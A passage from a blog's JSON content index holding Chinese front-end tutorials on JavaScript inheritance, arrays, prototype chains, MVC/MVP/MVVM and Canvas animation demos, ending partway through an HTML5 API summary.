delete this.method; this.password = password; this.world = function()&#123; console.log(this.password); &#125; &#125; var parent = new Parent(\"zhangsan\"); var child = new Child(\"lisi\",\"123456\"); parent.hello(); parent.sayMorning(); child.hello(); child.world(); 2、继承第二种方式：call()方法方式 12345678910111213141516171819202122232425262728function Parent(username)&#123; this.username = username; this.hello = function()&#123; console.log(this.username); &#125; &#125;Parent.prototype.sayMorning = function()&#123; console.log('good morning ' + this.username); &#125; function Child(username,password)&#123; Parent.call(this,username); this.password = password; this.world = function()&#123; console.log(this.password); &#125; &#125; var parent = new Parent(\"zhangsan\"); var child = new Child(\"lisi\",\"123456\"); parent.hello(); parent.sayMorning(); child.hello(); child.world();// child.sayMorning(); 通过prototype 添加的方法和属性，不能用来继承 3、继承的第三种方式：apply()方法方式 1234567891011121314151617181920212223242526function Parent(username)&#123; this.username = username; this.hello = function()&#123; console.log(this.username); &#125; &#125; Parent.prototype.sayMorning = function()&#123; console.log('good morning ' + this.username); &#125; function Child(username,password)&#123; Parent.apply(this,new Array(username)); this.password = password; this.world = function()&#123; console.log(this.password); &#125; &#125;var parent = new Parent(\"zhangsan\"); var child = new Child(\"lisi\",\"123456\"); parent.hello(); parent.sayMorning(); child.hello(); child.world();// child.sayMorning(); 通过prototype 添加的方法和属性，不能用来继承 4、继承的第四种方式：原型链方式，即子类通过prototype将所有在父类中通过prototype追加的属性和方法都追加到Child，从而实现了继承 12345678910111213141516171819function Person()&#123; &#125; Person.prototype.hello = \"hello\"; Person.prototype.sayHello = function()&#123; console.log(this.hello); &#125; function Child()&#123; &#125; Child.prototype = new Person();//这行的作用是：将Parent中将所有通过prototype追加的属性和方法都追加到Child，从而实现了继承 Child.prototype.world = \"world\"; Child.prototype.sayWorld = function()&#123; console.log(this.world); &#125; var c = new Child(); c.sayHello(); c.sayWorld();通过prototype 添加的方法和属性，不能用来继承 5、继承的第五种方式：混合方式, 混合了call或者apply方式、原型链方式 12345678910111213141516171819202122function Parent(hello)&#123; this.hello = hello; &#125; Parent.prototype.sayHello = function()&#123; console.log(this.hello); &#125; function Child(hello,world)&#123; Parent.call(this,hello);//将父类的属性继承过来 this.world = world;//新增一些属性 &#125; Child.prototype = new Parent();//将父类的方法继承过来 Child.prototype.sayWorld = function()&#123;//新增一些方法 console.log(this.world); &#125; var c = new Child(\"zhangsan\",\"lisi\"); c.sayHello(); c.sayWorld();可以继承通过prototype 添加的方法和属性","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"继承","slug":"继承","permalink":"https://ru23.com/tags/继承/"}]},{"title":"Javascript数组详解","slug":"2016-12-js-arr","date":"2016-12-13T06:55:24.000Z","updated":"2018-10-24T03:46:01.998Z","comments":true,"path":"note/40b57898.html","link":"","permalink":"https://ru23.com/note/40b57898.html","excerpt":"数组的定义 数组是按序号排列的一组值，每个值的位置都有编号（从0开始）。数组本质上是一种特殊的对象。它的键名是按（0，1，2...）排列的一组数字","text":"数组的定义 数组是按序号排列的一组值，每个值的位置都有编号（从0开始）。数组本质上是一种特殊的对象。它的键名是按（0，1，2...）排列的一组数字 创建数组： 12var arr = new Array(values);var arr = [vaules]; 判断比是否是个数组 Array.isArray(arr) arr instanceof Array 增加数组元素 push()方法 在数组的末尾增加一个或多个元素，并返回数组的新长度。 unshift()方法 在数组的开头增加一个或多个元素，并返回数组的新长度。 length 属性 1234567var arr = [1, 2, 3]arr.push(4)arr // 1, 2, 3, 4arr.unshift(6)arr // 6, 1, 2, 3, 4arr[arr.length] = 7 // 与push()方法类似arr // 6, 1, 2, 3, 4, 7 删除数组中的元素 delete 运算符，可以删除数组中的某个元素，但这不会改变length属性的值. pop() 方法 删除数组的最后一个元素，并返回这个元素 shift() 方法 删除数组的第一个元素，并返回这个元素 123456789var arr = [1,2,3];delete arr[0];arr // [undefined,2,3]arr.length // 3var last = arr.pop()var first = arr.shift()last // 3first // undefinedarr //2 类数组对象 在js中，有些对象被叫做“类数组对象”（array-like object），因为这些对象看起来很像数组，可以使用length属性，但是无法使用数组的方法。 典型的类数组对象是函数的arguments对象，以及大多数DOM元素集，还有字符串 1234567891011121314151617// arguments对象function args() &#123;return arguments; &#125;var arraylike = args('a','b')arrayLike[0] // 'a'arrayLike.length // 2arrayLike instanceof Array // falseArray.isArray(arrayLike) // false// DOM元素集var elts = document.getElementsByTagName('p');elts.length // 3eles instanceof Array // false//字符串'abc'[1] // 'b''abc'.length // 3'abc' instanceof Array // false 数组的遍历 for…in 循环 123456var a =[1, 2, 3];a.other = 'other';for (var i in arr)&#123; console.log( arr[i]);&#125;// 1, 2, 3, other 从上面的输出结果可以看出，利用for..in循环会将动态添加的非数字键的值遍历出来，因此需要使用的时候需要注意 for 循环和 while 循环 123456789101112131415161718var a = [1, 2, 3];// for循环for(var i = 0; i &lt; a.length; i++) &#123; console.log(a[i]);&#125;// while循环var i = 0;while (i &lt; a.length) &#123; console.log(a[i]); i++;&#125;var l = a.length;while (l--) &#123; console.log(a[l]);&#125; forEach()方法 123456789//array.forEach(callback[, thisArg])//callback 在数组的每一项上执行的函数，接受三个参数：item: 数组当前项的值，index: 当前项的索引，arr:数组本身。var arr = [1, 2, 3]arr.forEach(function(item, index, arr)&#123; console.log(item, index);&#125;);//1 0//2 1//3 2 数组常用的方法 join() 将数值转换为字符串 123var arr = [1, 2, 3];arr.join(); // \"1,2,3\"arr.join(\"_\"); // \"1_2_3\" reverse() 将数组逆序 1234// 原数组会被修改var arr = [1, 2, 3];arr.reverse(); // [3, 2, 1]arr; // [3, 2, 1] sort() 数组排序 默认情况下是升序排列的，底层是调用了每个数组项的 toString() 方法，然后比较得到字符串，即使每个数组项的数值是数字，比较的也是字符串 123456// 原数组会被修改var arr = [1, 12, 213, 1432, 'a'];arr.sort(); // [1, 12, 1432, 213, \"a\"]arr.sort(function(a, b)&#123; return b-a; //按倒序排列数组&#125;); slice() 返回部分数组 slice用于复制数组，复制完后旧数组不变，返回得到的新数组是旧数组的子集 第一个参数begin是开始复制的位置，需要注意的是，可以设负数。设负数表示从尾往前数几个位置开始复制 123456//原数组不会被修改var arr = [1, 2, 3, 4, 5];arr.slice(); //[1, 2, 3, 4, 5]arr.slice(1,3); // [2, 3]arr.slice(1, -1); // [2, 3, 4]arr; // [1, 2, 3, 4, 5] splice() 数组拼接 12345678910//原数组会被修改var arr = [1, 2, 3, 4, 5];//从第三个数组元素删除arr.splice(2); // returns [3, 4, 5] arr; // [1, 2]//从第三个数组元素删除，删除两个元素arr.splice(2, 2) // returns [3, 4]arr; // [1, 2, 5]//将'a','b'替换到数组的第二个元素arr.splice(1, 1, 'a', 'b') isArray() 判断是否是数组 1234var arr = [];var a = \"not array\";Array.isArray(arr); // trueArray.isArray(a); // false indexOf() lastIndexOf() 数组检索 两者都用于返回项目的索引值。区别是indexOf从头开始找，lastIndexOf从尾开始找。如果查找失败，无匹配，返回-1 1234567var arr = ['a', 'b', 'c', 'd', 'e'];arr.indexOf('c'); // 2 找到返回数组下标arr.indexOf('c', 3); // -1 指定从3号位开始查找arr.indexOf('f'); // -1 没找到该元素arr.lastIndexOf('c'); // 2arr.lastIndexOf('c',2); // 2arr.lastIndexOf('f'); // -1 没找到该元素","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"数组","slug":"数组","permalink":"https://ru23.com/tags/数组/"}]},{"title":"OOP之原型与原型链","slug":"2016-12-js-prototype","date":"2016-12-13T06:55:24.000Z","updated":"2018-10-24T03:46:02.012Z","comments":true,"path":"note/e36aeed5.html","link":"","permalink":"https://ru23.com/note/e36aeed5.html","excerpt":"prototype原型对象 每个函数都有一个默认的prototype属性，其实际上还是一个对象，如果被用在继承中，姑且叫做原型对象 在构造函数中的prototype中定义的属性和方法，会被创建的对象所继承下来。举个栗子：","text":"prototype原型对象 每个函数都有一个默认的prototype属性，其实际上还是一个对象，如果被用在继承中，姑且叫做原型对象 在构造函数中的prototype中定义的属性和方法，会被创建的对象所继承下来。举个栗子： 123456function F()&#123;&#125;F.prototype.work = function()&#123; console.log('F is working..');&#125;;var f = new F();f.work(); // F is working.. 当你创建函数时，JS会为这个函数自动添加 prototype 属性，值是空对象。而一旦你把这个函数当作构造函数（ constructor ）调用（即通过 new关键字调用），那么JS就会帮你创建该构造函数的实例，实例继承构造函数 prototype 的所有属性和方法（实例通过设置自己的__proto__ 指向构造函数的 prototype 来实现这种继承） 神秘的proto JS的对象中都包含了一个__proto__属性，其指向的是创建该对象时的构造函数的原型对象prototype 从上面的输出结果看出，f.__proto__指向了其构造函数F的prototype，而F.prototype本身也是一个对象，其内部也有__proto__属性，其指向的是Object.prototype,直到最后Object.prototype指向null，这条原型链才结束 因此，__proto__这个神秘的属性才是原型链形成的真正原因 原型链 由于原型对象本身也是对象，根据上边的定义，它也有自己的原型，而它自己的原型对象又可以有自己的原型，这样就组成了一条链，这个就是原型链，JavaScritp引擎在访问对象的属性时，如果在对象本身中没有找到，则会去原型链中查找，如果找到，直接返回值，如果整个链都遍历且没有找到属性，则返回undefined。原型链一般实现为一个链表，这样就可以按照一定的顺序来查找 从上图看出： Object.prototype是顶级对象，所有对象都继承自它。 Function继承 Function本身， Function.prototype 继承 Object.prototype Function.prototype 和 Function.__proto__ 都指向 Function.prototype Object.prototype.__proto__ === null ，说明原型链到 Object.prototype终止","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"原型链","slug":"原型链","permalink":"https://ru23.com/tags/原型链/"}]},{"title":"JS常用的内置函数整理","slug":"2016-12-js-inner-func","date":"2016-12-13T06:50:24.000Z","updated":"2018-10-24T09:45:29.982Z","comments":true,"path":"note/fc5e7486.html","link":"","permalink":"https://ru23.com/note/fc5e7486.html","excerpt":"String字符串对象 length 属性 长度 concat(String) 连接两个或更多个字符 indexOf(string) 返回出现字符的位置 substr(num1,[num2])截取字符串 toLowerCase()转成小写 toUpperCase()转成大写 replace(str1,str2) 字符串替换","text":"String字符串对象 length 属性 长度 concat(String) 连接两个或更多个字符 indexOf(string) 返回出现字符的位置 substr(num1,[num2])截取字符串 toLowerCase()转成小写 toUpperCase()转成大写 replace(str1,str2) 字符串替换 Date日期 getYear()返回年份（2位或4为） getFullYear()返回年份(4位) getMonth()返回月份0-11 getDate()返回日期1-31 getDay()返回星期数0-6 getHours()返回小时数0-23 getMinutes()返回分钟数0-59 getSeconds()返回秒数0-59 getMilliseconds()返回毫秒数0-999` Math数学对象 cell(数值)大于或等于该数的最小整数 floor(数值)小于或等于该数的最大整数 min(数值1，数值2)返回最小值 max(数值1，数值2)返回最大值 pow(数值1，数值2)返回数值1的数值2的次方 random()返回随机数0--1 round(数值)四舍五入 sqrt(数值)开平方根 数组对象 concat()返回一个由两个数组合并组成的新数组 join()返回一个由数组中的所有元素连接在一起的String对象 pop()删除数组中的最后一个元素并返回该值 push()向数组中添加新元素 返回新长度 shift()删除数组中的第一个元素并返回该值 unshift返回一个数组，在该数组头部插入指定的元素 sort()返回一个元素被排序了的Array对象 reverse()返回一个元素反序的Array对象 splice(index.num,foo...)返回数组的一个片段 –剪切 slice(start,end)复制 [start,end) 负数的时候 lenght+start/end","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"MVC、MVP、MVVM之间的关系","slug":"2016-12-mvc-mvp-mvvm","date":"2016-12-13T06:35:24.000Z","updated":"2018-10-24T03:46:02.014Z","comments":true,"path":"note/cec34af5.html","link":"","permalink":"https://ru23.com/note/cec34af5.html","excerpt":"一、MVC 什么是MVC MVC是一种模式，它将应用分为3个部分：数据（模型）、表现层（视图）、用户交互层（控制器） 一个事件的处理大概是这样 用户和应用产生交互 控制器的事件处理器被触发 控制器从模型中请求数据，并将其交给视图 视图将数据呈现给用户","text":"一、MVC 什么是MVC MVC是一种模式，它将应用分为3个部分：数据（模型）、表现层（视图）、用户交互层（控制器） 一个事件的处理大概是这样 用户和应用产生交互 控制器的事件处理器被触发 控制器从模型中请求数据，并将其交给视图 视图将数据呈现给用户 模型（数据保存） 模型用来存放用户的所有数据对象。比如有一个user模型，用来存放用户列表、他们的属性以及所有和模型有关的逻辑 模型不必知晓视图和控制器的细节，模型只需包含数据以及直接和这些数据相关的逻辑 视图（用户界面） 视图是呈现给用户的，用户与之产生交互。在JavaScript应用中，视图大都是由HTML、css、JavaScript模板组成的 控制器（业务逻辑） 控制器是模型和视图之间的纽带。控制器从视图获得事件和输入，对它们进行进行处理，并相应的更新视图。 当页面加载时，控制器会给视图添加事件监听，比如监听表单提交或按钮点击。然后当用户和你的应用产生交互时，控制器中的事件触发器就开始工作了 总结一下： Controller 监听 Model 变化，Model 一变，Controller 就会去更新View。 Controller 监听用户交互，用户点了提交或修改按钮，Controller 就要去更新 Model View 传送指令到 Controller Controller 完成业务逻辑后，要求 Model 改变状态 Model 将新的数据发送到 View，用户得到反馈 各部分之间的通信方式 互动模式 接受用户指令时，MVC 可以分成两种方式。一种是通过 View 接受指令，传递给 Controller 另一种是直接通过controller接受指令 二、MVP MVP 模式将 Controller 改名为Presenter`，同时改变了通信方向 各部分之间的通信，都是双向的。 View 与Model 不发生联系，都通过 Presenter 传递。 View 非常薄，不部署任何业务逻辑，称为”被动视图”（Passive View），即没有任何主动性，而 Presenter非常厚，所有逻辑都部署在那里 三、MVVM MVVM 模式将 Presenter 改名为 ViewModel，基本上与 MVP 模式完全一致 唯一的区别是，它采用双向绑定（data-binding）：View的变动，自动反映在 ViewModel，反之亦然","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"MVC","slug":"MVC","permalink":"https://ru23.com/tags/MVC/"}]},{"title":"Canvas 绘制八大行星","slug":"2016-12-Canvas-draw-sun","date":"2016-12-02T15:50:24.000Z","updated":"2018-10-24T03:46:01.992Z","comments":true,"path":"note/17ec6504.html","link":"","permalink":"https://ru23.com/note/17ec6504.html","excerpt":"在线演示地址 http://codepen.io/poetries/pen/KNZLJZ 123&lt;canvas width=\"1000\" height=\"1000\" id=\"canvas\" style=\"background:#000;\"&gt; 您的浏览器不支持，请升级浏览器!&lt;/canvas&gt;","text":"在线演示地址 http://codepen.io/poetries/pen/KNZLJZ 123&lt;canvas width=\"1000\" height=\"1000\" id=\"canvas\" style=\"background:#000;\"&gt; 您的浏览器不支持，请升级浏览器!&lt;/canvas&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145//设置2d绘图环境var ctx = document.getElementById(\"canvas\").getContext(\"2d\");//轨道function drawTrack()&#123; for(var i = 0;i &lt; 8;i++)&#123; ctx.beginPath(); ctx.arc(500,500,(i+1) * 50,0,360,false); ctx.strokeStyle = \"#fff\";//设置笔触颜色 ctx.stroke(); ctx.closePath(); &#125;&#125;//星球function Star(x,y,radius,cycle,sColor,eColor)&#123; //画出星球需要的属性 //星球的坐标点 星球的半径 星球的颜色（开始颜色、结束颜色） //公转周期 //星球坐标点 this.x = x; this.y = y; this.radius = radius; this.cycle = cycle; this.eColor = eColor; this.sColor = sColor; this.color = null;//渐变颜色空对象 this.time = 0;//设置一个计时器 this.draw = function()&#123; //save()可以这样理解 原来的画布内容不变 把save（）和restore()之间的内容画好了 在塞进来 ctx.save();//保存之前的画布内容 ctx.translate(500,500);//重置0,0坐标点 ctx.rotate(this.time * (360/this.cycle) * Math.PI / 180);//设置旋转角度 //画星球 ctx.beginPath(); ctx.arc(this.x,this.y,this.radius,0,360,false); ctx.closePath(); //设置星球的填充颜色 this.color = ctx.createRadialGradient(this.x,this.y,0,this.x,this.y,this.radius); this.color.addColorStop(0,this.sColor);//渐变颜色开始点 this.color.addColorStop(0,this.eColor);//渐变颜色结束点 ctx.fillStyle = this.color; ctx.fill();//执行填充命令 //填充星球 ctx.restore();//恢复之前保存的画布内容 this.time +=1; &#125;&#125; //创建一个太阳对象的构造函数function Sun()&#123; Star.call(this,0,0,20,0,\"#F00\",\"#f90\");&#125;//创建一个水星的对象构造方法function Mercury()&#123; Star.call(this,0,-50,10,87.70,\"#A69697\",\"#5C3E40\");&#125;//创建一个金星的对象构造方法function Venus()&#123; Star.call(this,0,-100,10,224.701,\"#C4BBAC\",\"#1F1315\");&#125;//创建一个地球的对象构造方法function Earth()&#123; Star.call(this,0,-150,10,365.224,\"#78B1E8\",\"#050C12\");&#125;//创建一个火星的对象构造方法function Mars()&#123; Star.call(this,0,-200,10,686.98,\"#CEC9B6\",\"#76422D\");&#125;//创建一个木星的对象构造方法function Jupiter()&#123; Star.call(this,0,-250,10,4332.589,\"#C0A48E\",\"#322222\");&#125;//创建一个土星的对象构造方法function Saturn()&#123; Star.call(this,0,-300,10,10759.5,\"#F7F9E3\",\"#5C4533\");&#125; //创建一个天王星的对象构造方法function Uranus()&#123; Star.call(this,0,-350,10,30799.095,\"#A7E1E5\",\"#19243A\");&#125;//创建一个海王星的对象构造方法function Neptune()&#123; Star.call(this,0,-400,10,60152,\"#0661B2\",\"#1E3B73\");&#125; //创建太阳对象实例var sun=new Sun();//创建水星对象实例var water=new Mercury();//创建金星对象实例var gold=new Venus();//创建一个地球对象实例var diqiu=new Earth();//创建一个火星对象实例var fire=new Mars();//创建一个木星对象实例var wood=new Jupiter();//创建一个土星对象实例var soil=new Saturn();//创建一个天王星对象实例var god=new Uranus();//创建一个海王星对象实例var sea=new Neptune(); function move()&#123; //清除画布 ctx.clearRect(0,0,1000,1000); //画出轨道 drawTrack(); //画出每个星球 sun.draw(); water.draw(); gold.draw(); diqiu.draw(); fire.draw(); wood.draw(); soil.draw(); god.draw(); sea.draw(); &#125;//使让星球进行运动setInterval(move,10);","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"HTML5","slug":"HTML5","permalink":"https://ru23.com/tags/HTML5/"},{"name":"Canvas","slug":"Canvas","permalink":"https://ru23.com/tags/Canvas/"}]},{"title":"Canvas 绘制粒子动画背景","slug":"2016-12-draw-particle-animator-with-canvas","date":"2016-12-02T12:30:24.000Z","updated":"2018-10-24T03:46:01.996Z","comments":true,"path":"note/fc137cfa.html","link":"","permalink":"https://ru23.com/note/fc137cfa.html","excerpt":"1&lt;canvas id=\"canvas\"&gt;您的浏览器不支持，请升级最新的版本!&lt;/canvas&gt;","text":"1&lt;canvas id=\"canvas\"&gt;您的浏览器不支持，请升级最新的版本!&lt;/canvas&gt; 123456789101112*&#123; margin:0px; padding:0px;&#125;body&#123; background:#000;&#125;canvas&#123; position:absolute; width:100%; height:100%;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153window.requestAnimFrame = ( function() &#123; return window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || function( callback ) &#123; window.setTimeout( callback, 1000 / 60 ); &#125;; &#125;)(); var can = document.getElementById(\"canvas\"); var cxt = can.getContext(\"2d\"); can.width = window.innerWidth; can.height = window.innerHeight; cxt.lineWidth = 0.3; //初始链接线条显示位置 var mousePosition = &#123; x : 30*can.width/100, y : 30*can.height/100 &#125; //圆形粒子对象参数 var dots = &#123; n : 500,//圆形粒子个数 distance : 50,//圆形粒子之间的距离 d_radius : 100,//粒子距离鼠标点的距离 array : []//保存n个圆形粒子对象 &#125; //创建随即颜色值 function colorValue(min)&#123; return Math.floor(Math.random()*255 + min); &#125; function createColorStyle(r,g,b)&#123; return \"rgba(\"+r+\",\"+g+\",\"+b+\", 1)\"; &#125; //混合两个圆形粒子的颜色 function mixConnect(c1,r1,c2,r2)&#123;//圆的颜色 半径 return (c1*r1+c2*r2)/(r1+r2); &#125;; //生成线条的颜色 function lineColor(dot1,dot2)&#123;//获取具体的圆的颜色再计算 var color1 = dot1.color, color2 = dot2.color; var r = mixConnect(color1.r,dot1.radius,color2.r,dot2.radius); var g = mixConnect(color1.g,dot1.radius,color2.g,dot2.radius); var b = mixConnect(color1.b,dot1.radius,color2.b,dot2.radius); return createColorStyle(Math.floor(r),Math.floor(g),Math.floor(b)); &#125; //生成圆形粒子的颜色对象 function Color(min)&#123; min = min || 0; this.r = colorValue(min); this.g = colorValue(min); this.b = colorValue(min); this.style = createColorStyle(this.r,this.g,this.b); &#125; //创建圆形粒子对象 function Dot()&#123; //圆形粒子随机圆心坐标点 this.x = Math.random()*can.width; this.y = Math.random()*can.height; //x y 方向运动的速度值 this.vx = -0.5 + Math.random(); this.vy = -0.5 + Math.random(); this.radius = Math.random()*5; //this.color = \"#ff3333\"; this.color = new Color(); &#125; //绘制出圆形粒子 Dot.prototype.draw = function()&#123; cxt.beginPath(); cxt.fillStyle = this.color.style; cxt.arc(this.x,this.y,this.radius,0,Math.PI*2,false); cxt.fill(); &#125; //添加圆形粒子 function createCircle()&#123; for (var i=0;i&lt;dots.n ;i++ ) &#123; dots.array.push(new Dot()); &#125; &#125; //绘制出圆形粒子 function drawDots()&#123; for (var i=0;i&lt;dots.n ;i++ ) &#123; var dot = dots.array[i]; dot.draw(); &#125; &#125; //drawDots(); //移动 function moveDots()&#123; for (var i=0;i&lt;dots.n ;i++ )&#123; var dot = dots.array[i]; //当圆形粒子对象碰壁的时候就反弹回来 if (dot.y &lt; 0 || dot.y &gt; can.height) &#123; dot.vx = dot.vx; dot.vy = -dot.vy; &#125;else if (dot.x &lt; 0 || dot.x &gt; can.width) &#123; dot.vx = -dot.vx; dot.vy = dot.vy; &#125; //给圆形粒子圆心坐标加上速度值移动圆形粒子 dot.x += dot.vx; dot.y += dot.vy; &#125; &#125; //链接粒子对象 function connectDots()&#123; for (var i=0;i&lt;dots.n ; i++) &#123; for ( var j=0;j&lt;dots.n ; j++) &#123; iDot = dots.array[i]; jDot = dots.array[j]; if ((iDot.x - jDot.x) &lt; dots.distance &amp;&amp; (iDot.y - jDot.y) &lt; dots.distance &amp;&amp; (iDot.x - jDot.x) &gt; -dots.distance &amp;&amp; (iDot.y - jDot.y) &gt; -dots.distance) &#123; if ((iDot.x - mousePosition.x) &lt; dots.d_radius &amp;&amp; (iDot.y - mousePosition.y) &lt; dots.d_radius &amp;&amp; (iDot.x - mousePosition.x) &gt; -dots.d_radius &amp;&amp; (iDot.y - mousePosition.y) &gt; -dots.d_radius) &#123; cxt.beginPath(); //cxt.strokeStyle = \"yellow\"; cxt.strokeStyle = lineColor(iDot,jDot); cxt.moveTo(iDot.x,iDot.y); cxt.lineTo(jDot.x,jDot.y); cxt.closePath(); cxt.stroke(); &#125; &#125; &#125; &#125; &#125; createCircle(); //让圆形粒子不断的移动 function animateDots()&#123; cxt.clearRect(0,0,can.width,can.height); moveDots(); connectDots() drawDots(); requestAnimFrame(animateDots); &#125; animateDots(); can.onmousemove = function(ev)&#123; var ev = ev || window.event; mousePosition.x = ev.pageX; mousePosition.y = ev.pageY; &#125; can.onmouseout = function()&#123; mousePosition.x = can.width/2; mousePosition.y = can.height/2; &#125;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"HTML5","slug":"HTML5","permalink":"https://ru23.com/tags/HTML5/"},{"name":"Canvas","slug":"Canvas","permalink":"https://ru23.com/tags/Canvas/"}]},{"title":"Canvas 绘制动画时钟","slug":"2016-12-Canvas-draw-clock","date":"2016-12-02T11:35:24.000Z","updated":"2018-10-24T03:46:01.990Z","comments":true,"path":"note/1e283ca4.html","link":"","permalink":"https://ru23.com/note/1e283ca4.html","excerpt":"在线演示地址 http://codepen.io/poetries/pen/gLoQzo 123 &lt;canvas id=\"clock\" width=\"500\" height=\"500\"&gt; 您的浏览器不支持此效果展示，请升级最新版本&lt;/canvas&gt;","text":"在线演示地址 http://codepen.io/poetries/pen/gLoQzo 123 &lt;canvas id=\"clock\" width=\"500\" height=\"500\"&gt; 您的浏览器不支持此效果展示，请升级最新版本&lt;/canvas&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118var clock = document.getElementById(\"clock\");var context = clock.getContext(\"2d\");function drawClock()&#123; context.clearRect(0,0,500,500);//清空画布 每画一次 都要清除前面的在重新画 var now = new Date(); var sec = now.getSeconds(); var min = now.getMinutes(); var hour = now.getHours(); //小时必须获取浮点类型（小时 + 分数转换成的小时） hour = hour + min / 60; //将24小时进制转换为12小时 不然就是 这样的形式不好了 18:30:10 hour = hour &gt; 12 ? hour - 12 : hour; //表盘 context.lineWidth = 10; context.strokeStyle = \"greenblue\" context.beginPath(); context.arc(250,250,200,0,360,false);//true 顺时针 context.closePath(); context.stroke(); //时刻度 for(var i = 0; i &lt; 12; i++)&#123; context.save();//保存当前状态 context.lineWidth = 7;//时针粗细 context.strokeStyle = \"#000\";//时针颜色 context.translate(250,250);//设置0,0点 context.rotate(i * 30 * Math.PI / 180);//获得每次旋转之后的角度 设置旋转角度 角度 * Math.PI / 180 = 弧度 context.beginPath(); context.moveTo(0,-170); context.lineTo(0,-190); context.stroke(); //笔触 context.closePath(); context.restore();//恢复当前状态 &#125; //分刻度 for(var i = 0;i &lt; 60; i++)&#123; context.save(); context.lineWidth = 5;//设置分刻度粗细 context.strokeStyle = \"#000\"; context.translate(250,250);//重置0,0点 context.rotate(i * 6 * Math.PI / 180);//设置旋转角度 context.beginPath(); context.moveTo(0,-180); context.lineTo(0,-190); context.stroke(); context.closePath(); context.restore(); &#125; //时针 context.save(); //保存当前绘制的状态 //设置时针风格 context.lineWidth = 7; context.strokeStyle = \"#000\"; context.translate(250,250);//设置异次元空间的0,0 点 context.rotate( hour * 30 * Math.PI / 180);//设置旋转角度 context.beginPath(); context.moveTo(0,-140); context.lineTo(0,10); context.closePath(); context.stroke(); context.restore(); //分针 context.save(); context.lineWidth = 5;//设置分针风格 context.strokeStyle = \"#000\"; context.translate(250,250); context.rotate(min * 6 * Math.PI / 180);//设置旋转角度 context.beginPath(); context.moveTo(0,-160); context.lineTo(0,15); context.closePath(); context.stroke(); context.restore(); //秒针 context.save(); context.lineWidth = 3;//设置分针风格 context.strokeStyle = \"#f00\"; context.translate(250,250); context.rotate(sec * 6 * Math.PI / 180);//设置旋转角度 每秒走的角度是6度 context.beginPath(); context.moveTo(0,-170); context.lineTo(0,20); context.closePath(); context.stroke(); //画时针 分针 秒针的交叉点 context.beginPath(); context.arc(0,0,5,0,360,false);//FALSE 逆时针 context.closePath(); context.fillStyle = \"gray\";//设置填充样式 context.fill(); context.stroke(); //设置秒针的小圆点 context.beginPath(); context.arc(0,-160,2,0,360,false);//FALSE 逆时针 context.closePath(); context.fillStyle = \"blue\";//设置填充样式 context.fill(); context.stroke(); context.restore();&#125;drawClock(); //这一句必须加上 因为setInterval 第一秒不执行setInterval(drawClock,1000);","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"HTML5","slug":"HTML5","permalink":"https://ru23.com/tags/HTML5/"},{"name":"Canvas","slug":"Canvas","permalink":"https://ru23.com/tags/Canvas/"}]},{"title":"HTML5之API总结","slug":"2016-11-h5-api","date":"2016-11-26T06:35:24.000Z","updated":"2018-10-24T03:46:01.940Z","comments":true,"path":"note/6cc0c2d4.html","link":"","permalink":"https://ru23.com/note/6cc0c2d4.html","excerpt":"一、Canvas API canvas API是H5标准中最复杂的部分， 它提供几种属性和方法，可以在canvas元素上创建图形应用 方法","text":"一、Canvas API canvas API是H5标准中最复杂的部分， 它提供几种属性和方法，可以在canvas元素上创建图形应用 方法 以下方法专门用于调用canvas API getContext(context)创建可绘制图形的画布上下文，接受两个值，2d和3d fillRect(x,y,width,height)绘制实心矩形 strokeRect(x,y,width,height)绘制矩形轮廓 clearRect(x,y,width,height)清除画布指定区域内容 createLinearGradient(x1,y1,x2,y2)创建一个线性渐变效果 createRadialGradient(x1,y1,r1,x2,y2,r2)创建一个放射渐变效果 addColorStop(position,color)用于声明渐变颜色position范围是0.0-1.0 用于确定颜色开始变化位置 beginPath()开始一条新路径 closePath()在路径最后实现封闭该路径，它会生成一条直线，连接笔触的最后一个位置与路径的起点。如想要保持路径开放，使用fill()绘图，不用这个方法 stroke() 用于创建路径轮廓 fill()用于绘制实心形状 clip()用于创建一个由路径定义的裁剪区域，只有在落入形状内的内容才绘制到画布上 moveTo(x,y)将虚拟笔触移到新位置，下一个方法会从改点的开始继续设置路径 lineTo(x,y)在新路径上添加一条直线 rect(x,y,width,height)在路径为(x,y)位置上添加width和height矩形 arc(x,y,radius,startAngle,endAngle,direction)在路径上添加一条弧线 ,x,y指定弧线的中心，角度单位为弧度，direction是一个表示顺时针或逆时针的布尔值。使用公式 Math.PI/180x角度，将角度转换为半径 strokeText(text,x,y,max) 直接在画布上绘制文字轮廓。可选参数，max声明文字最大尺寸 fillText(text,x,y,max)直接在画布上绘制实心文字。可选参数，max声明文字最大尺寸 translate(x,y)将画布原点移到点(x,y)处，原点（0,0）初始位置位于canvas所在区域的左上角 rorate(angle)这个方法可以使画布原点为中心发生旋转，角度必须是弧度。使用公式Math.PI/180x 将角度转换为弧度 scale(x,y) 